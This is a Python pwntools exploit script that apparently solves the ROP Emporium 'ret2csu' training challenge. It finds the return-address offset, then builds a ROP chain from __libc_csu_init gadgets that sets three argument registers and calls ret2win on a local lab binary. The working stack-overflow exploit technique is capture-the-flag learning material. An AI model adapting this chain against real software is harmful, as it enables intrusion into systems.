from pwn import *
import binascii
import warnings
import struct
warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-gef
break print_file
'''.format(**locals())

exe = './ret2csu'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

def find_eip(payload):
    p = process(exe)
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

eip_offset = find_eip(cyclic(100))

# rdi, rsi, rdx

pop_rbx_rbp_r12_r13_r14_r15_ret = 0x000000000040069a
mov_rdx_r15_mov_rsi_r14_mov_edi_r13d_call_qword = 0x0000000000400680 #r12 + rbx*8
ret2win = 0x0000000000400510
pop_rdi = 0x00000000004006a3

rbx_important = 0xe4
target_pointer_which_points_to_a_function_to_execute = 0x6003b0

def generate_r12(rbx, target_address_i_need_to_be_a_pointer):
    return int(hex(target_address_i_need_to_be_a_pointer - rbx * 8), 16)

payload = fit({
    eip_offset: [
        pop_rbx_rbp_r12_r13_r14_r15_ret,
        rbx_important,
        rbx_important + 0x1,
        generate_r12(rbx_important, target_pointer_which_points_to_a_function_to_execute),
        0x0, # should not matter since we are popping it anyway and that the mov gadget only moves r13 to edi (bottom half of rdi)
        p64(0xcafebabecafebabe),
        struct.pack("Q", 0xd00df00dd00df00d),
        mov_rdx_r15_mov_rsi_r14_mov_edi_r13d_call_qword,
        pack(0) * 7,
        pack(0x00000000004006a3, 64), # pop_rdi 0x00000000004006a3
        0xdeadbeefdeadbeef,
        b"\x10\x05\x40\x00\x00\x00\x00\x00" # ret2win 0x0000000000400510
    ] 
})
io = start()
write("payload", payload)
io.sendlineafter('>', payload)
io.interactive()

